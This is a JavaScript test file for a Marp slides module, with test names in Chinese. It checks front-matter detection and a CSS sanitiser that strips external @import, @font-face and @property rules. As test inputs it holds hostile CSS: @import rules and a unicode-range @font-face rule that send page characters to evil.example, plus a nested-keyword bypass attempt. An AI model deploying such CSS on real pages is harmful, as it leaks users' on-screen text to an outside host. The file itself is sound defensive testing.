// 執行：node --test src/slides.test.js
import { test } from "node:test";
import assert from "node:assert/strict";
import { isSlides, stripFrontMatter, stripImports, SLIDES_TEMPLATE } from "./slides.js";

test("只有 front matter 寫 marp: true 才是簡報", () => {
  assert.equal(isSlides("---\nmarp: true\n---\n# A"), true);
  assert.equal(isSlides("---\ntheme: gaia\nmarp: true\n---"), true);
  assert.equal(isSlides(SLIDES_TEMPLATE), true);
  assert.equal(isSlides("---\nmarp: false\n---"), false);
  assert.equal(isSlides("# A\n---\nmarp: true\n---"), false); // 不在開頭
  assert.equal(isSlides("# 一般文件\n\n---\n\n分隔線"), false);
});

test("去掉 front matter", () => {
  assert.equal(stripFrontMatter("---\nmarp: true\n---\n# A"), "# A");
  assert.equal(stripFrontMatter("# A\n---\nb\n---"), "# A\n---\nb\n---");
});

test("拿掉外部 @import，保留主題字型", () => {
  const font = '@import "https://fonts.bunny.net/css?family=Lato";';
  assert.equal(
    stripImports(`${font}@import url("https://evil.example/x.css");@import 'https://evil.example/y.css';div{}`),
    `${font}  div{}`,
  );
});

test("拿掉 @font-face：unicode-range 可以逐字偷讀頁面上的文字", () => {
  const css = stripImports(
    "@font-face{font-family:Menlo;src:url(https://evil.example/?c=61);unicode-range:U+61}" +
      "@FONT-FACE {src:url(https://evil.example/b)}" +
      "@font@font-face{}-face{src:url(https://evil.example/c)}div{}",
  );
  assert.doesNotMatch(css, /@font-face/i);
  assert.match(css, /div\{\}$/);
});

test("拿掉 @property：會蓋掉 Tailwind 註冊的 --tw-* 變數", () => {
  const css = stripImports(
    '@property --tw-border-style{syntax:"*";inherits:false;initial-value:none}' +
      "@PROPERTY --tw-x {initial-value:1px}div{}",
  );
  assert.doesNotMatch(css, /@property/i);
  assert.match(css, /div\{\}$/);
});
